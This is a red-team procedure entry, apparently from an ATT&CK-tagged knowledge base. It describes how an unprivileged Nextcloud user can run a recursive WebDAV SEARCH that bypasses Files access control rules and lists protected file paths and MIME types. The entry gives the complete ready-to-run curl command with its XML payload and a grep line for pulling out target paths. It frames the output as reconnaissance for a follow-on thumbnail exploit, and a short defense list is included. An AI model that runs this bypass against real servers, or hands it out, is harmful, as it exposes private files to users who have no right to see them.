---
id: proc-uuid-3
tags:
  - webdav
  - file-discovery
  - nextcloud
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/webdav-search-curl]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:28:58.700Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
---
# Perform-WebDAV-Search-to-List-Files

## Summary

This procedure uses WebDAV SEARCH as an unprivileged user to recursively list all files in a shared folder to unlimited depth, bypassing Files access control rules and revealing paths and MIME types of protected files for subsequent targeting.

## Description

Authenticate as the unprivileged user and issue a WebDAV SEARCH request with infinite depth scope on the shared folder root. The endpoint ignores access rules, returning an XML list of all files, including subfolders. This enables identification of sensitive files like images for thumbnail exploitation. Target: Nextcloud WebDAV at /remote.php/dav/files/user/. Impact: Full directory structure exposure.

## Requirements

1. Unprivileged user credentials
2. Shared folder access
3. curl installed on client
4. HTTPS access to Nextcloud WebDAV

## Defense

Defensive measures and detection strategies:

- Patch Nextcloud to enforce access rules on WebDAV SEARCH
- Limit WebDAV depth or disable recursive searches
- Log and alert on SEARCH requests with depth=infinity
- Use network ACLs to restrict WebDAV from untrusted clients

## Objectives

1. Discover protected file paths and types recursively
2. Identify exploitable files (e.g., images, text)
3. Obtain data for API thumbnail requests

## Instructions

### Step 1: Authenticate and Prepare Request

**Context**: Log in as unprivileged user and construct the SEARCH XML for basic search with all props and infinite depth.

No command; prepare XML payload.

> XML includes <d:depth>infinity</d:depth> and props like fileid, size, mimetype, displayname.

### Step 2: Execute WebDAV SEARCH

**Context**: Send the SEARCH request to list files, saving output as data.xml.

**Command** ([[commands/webdav-search-curl]]):

```bash
curl -u user https://example.com/remote.php/dav/files/user/ -X SEARCH -H "Content-Type: text/xml" --data "<?xml version=\"1.0\"?><d:searchrequest xmlns:d=\"DAV:\" xmlns:oc=\"http://owncloud.org/ns\"><d:basicsearch><d:select><d:prop><oc:fileid/><oc:size/><oc:mimetype/><d:displayname/><d:getcontenttype/></d:prop></d:select><d:from><d:scope><d:href>/</d:href><d:depth>infinity</d:depth></d:scope></d:from><d:where><d:like><d:prop><d:displayname/></d:prop><d:literal>*</d:literal></d:like></d:where><d:orderby><d:prop><d:displayname/></d:prop></d:orderby></d:basicsearch></d:searchrequest>" -o data.xml
```

> This performs a recursive search matching all files (*), returning XML with full paths and MIME types. Expected output: data.xml with entries like <d:response><d:href>/Secret_Folder/Secret_Subfolder/Secret_Picture.jpeg</d:href><oc:mimetype>image/jpeg</oc:mimetype>.

### Step 3: Parse Output

**Context**: Review XML to identify target files.

Use grep or XML parser: grep -oP '(?<=<d:href>)/[^<]+' data.xml

> Expected output: List of paths like /Secret_Folder/Secret_Subfolder/Secret_Picture.jpeg.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[File and Directory Discovery]] File and Directory Discovery

### Sub-Techniques


## Commands Used

- [[commands/webdav-search-curl]]

## Tools Used

- [[tools/curl]]

## Tags

- webdav
- file-discovery
- nextcloud
